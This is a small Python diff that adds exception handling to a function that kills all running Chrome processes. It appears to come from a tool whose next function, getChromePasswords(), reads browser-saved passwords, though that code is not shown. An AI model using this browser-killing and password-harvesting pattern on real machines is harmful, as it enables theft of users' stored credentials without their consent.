@@ -7,8 +7,11 @@ def killChrome():
     PROCNAME = "chrome.exe"
 
     for proc in psutil.process_iter():
-        if proc.name() == PROCNAME:
-            proc.kill()
+        try:
+            if proc.name() == PROCNAME:
+                proc.kill()
+        except psutil.AccessDenied:
+            pass
 
 
 def getChromePasswords():
